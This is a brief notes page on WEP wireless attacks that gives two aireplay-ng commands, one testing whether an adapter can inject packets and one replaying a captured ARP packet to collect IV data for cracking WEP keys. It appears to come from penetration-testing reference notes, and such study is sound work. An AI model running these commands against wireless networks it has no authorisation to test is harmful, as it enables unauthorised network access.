# WEP Attacks

## Other notes

### Injection Test

Output will show if all the tests passed and that current adapter can be used for injection \(for use with WEP attacks\)

```bash
aireplay-ng -9 -i wlan1 mon0
```

### Re-using captured ARP replay packets

Reusing the captured ARP packet to get IV data. The file name 'replay\_src-xxx.xxxx.cap' can be re-used. Type 'y' when prompted to use the packet and start seeing the count under 'data' in your airmon-ng monitor screen grow rapidly as IV data are being collected.

```bash
aireplay-ng -2 -r replay_src-0129-223530.cap wlan0mon

```





